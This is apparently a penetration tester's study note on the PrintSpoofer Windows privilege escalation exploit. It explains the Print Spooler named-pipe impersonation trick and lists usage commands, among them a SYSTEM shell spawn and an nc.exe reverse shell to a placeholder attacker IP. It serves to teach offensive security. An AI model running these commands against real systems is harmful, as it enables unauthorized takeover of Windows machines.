---
created: 2026-07-21
tags:
  - Windows
  - Windows_PrivEsc
status: incomplete
---
## PrintSpoofer

> **[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)** is a local privilege escalation exploit that abuses the Windows **Print Spooler service** and **named pipe impersonation** to escalate from a service account with **`SeImpersonatePrivilege`** to `NT AUTHORITY\SYSTEM`.

> [!warning]+ Compatibility
> - Works on **Windows 8.1** through **Windows Server 2019** and beyond (including builds where [[JuicyPotato]] is mitigated).
> - Requires the **Print Spooler** service (`spoolsv.exe`) to be running.
> - Requires `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`).

- Attempt PrintSpoofer if:
	- You have code execution as a **service account** (IIS AppPool, MSSQL service, etc.) or any account with **`SeImpersonatePrivilege`**.
	- The target is running **Windows 10 `1809`+** or **Windows Server 2019** (where [[JuicyPotato]] no longer works).
	- The **Print Spooler** service is running (it is enabled by default on most Windows installations).

- Verify current privileges:

```powershell
whoami /priv
```

- Look for `SeImpersonatePrivilege`; counts even if the state shows `Disabled`.

>[!note] See [[🛠️ Windows privileges#`SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`]] for more on these privileges and which accounts hold them by default.

- Check if the Print Spooler service is running:

```powershell
Get-Service Spooler
```

```cmd
sc query spooler
```


![[JuicyPotato#What changed after JuicyPotato]]

- Instead of abusing COM/DCOM activation, PrintSpoofer abuses the **Print Spooler service** and **named pipe impersonation** (unaffected by the OXID restriction).
## How PrintSpoofer works

PrintSpoofer chains three steps to get from a service account to `SYSTEM`:

1. **Create a named pipe with a controlled path**
	- PrintSpoofer creates a named pipe at a path like `\\.\pipe\foo\pipe\spoolss`.
	- The pipe's DACL allows `Everyone` to connect, so any process (including `SYSTEM` services) can write to it.

> [!note] See [[🛠️ Named pipes#Named pipe impersonation]] for how named pipe impersonation works.

2. **Coerce the Print Spooler to connect**
	- PrintSpoofer calls `RpcRemoteFindFirstPrinterChangeNotificationEx()`, a function in the **MS-RPRN** (Print System Remote Protocol) RPC interface.
	- This function tells the Print Spooler service to send printer change notifications to a specified "client" machine via RPC over a named pipe.
	- Normally, the Spooler would connect back to `\\<HOSTNAME>\pipe\spoolss` (its own pipe). You can't hijack that pipe (it already belongs to `SYSTEM`). The exploit works thanks to **path validation bypass**.
	- If the **hostname** contains a **forward slash** (`/`), the path validation in the Spooler passes, but Windows path normalization converts the `/` to `\`:
		- The attacker specifies: `\\HOSTNAME/pipe/foo`
		- The Spooler normalizes this to: `\\HOSTNAME\pipe\foo\pipe\spoolss`
		- This is a **valid named pipe path** — and the attacker controls `\\.\pipe\foo\pipe\spoolss`.
	- The Print Spooler service (`spoolsv.exe`), running as `SYSTEM`, connects to the attacker's named pipe.

> [!important] The Spooler connects as `SYSTEM` because **`spoolsv.exe` runs under the `SYSTEM` account**. When it opens the named pipe to send notifications, it authenticates as `SYSTEM`.

3. **Impersonate and spawn a `SYSTEM` process**
	- PrintSpoofer calls `ImpersonateNamedPipeClient()` to capture the `SYSTEM` impersonation token from the Spooler connection.
	- It then calls `DuplicateTokenEx()` to convert the impersonation token into a **primary token**.
	- Finally, it launches the payload using `CreateProcessWithTokenW()` (requires `SeImpersonatePrivilege`) or `CreateProcessAsUserW()` (requires `SeAssignPrimaryTokenPrivilege`).
	- The new process runs as `NT AUTHORITY\SYSTEM`.

> [!note] See [[🛠️ Access tokens and impersonation#Token duplication]] for the difference between primary and impersonation tokens.

## Exploitation

- Get the **[PrintSpoofer exploit](https://github.com/itm4n/PrintSpoofer)**:

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

> [!note] See [releases](https://github.com/itm4n/PrintSpoofer/releases) — choose `PrintSpoofer32.exe` or `PrintSpoofer64.exe` based on target architecture.

- Spawn an interactive `cmd.exe` as `SYSTEM`:

```powershell
PrintSpoofer64.exe -i -c cmd.exe
```

- Reverse shell:

```powershell
PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <attacker_ip> <port> -e cmd.exe"
```

### Option reference

| Option | Description                                            |
| ------ | ------------------------------------------------------ |
| `-i`   | Interact with the spawned process (interactive shell). |
| `-c`   | Command to execute as `SYSTEM`.                        |
| `-d`   | Desktop to use (default: `current`).                   |
 
>[!tip]+ Troubleshooting
> 
> - `[-] A network error occurred` or no connection -> Verify the Print Spooler service is running (`Get-Service Spooler`).
> - Token is `SecurityIdentification` (can't act as `SYSTEM`) -> You don't have `SeImpersonatePrivilege`. Verify with `whoami /priv`.
> - Exploit not working on very old builds -> PrintSpoofer requires the `/`-in-hostname normalization behavior. On pre-Win 8.1 systems, try [[JuicyPotato]] instead.
## References and further reading

- [`PrintSpoofer — GitHub (itm4n)`](https://github.com/itm4n/PrintSpoofer)
- [`PrintSpoofer — Abusing Impersonation Privileges on Windows 10 and Server 2019 — itm4n's blog`](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [`SpoolSample — GitHub (leechristensen)`](https://github.com/leechristensen/SpoolSample)
- [`MS-RPRN: Print System Remote Protocol — Microsoft Learn`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/)
- [`Potatoes — Windows Privilege Escalation — Jorge Lajara`](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
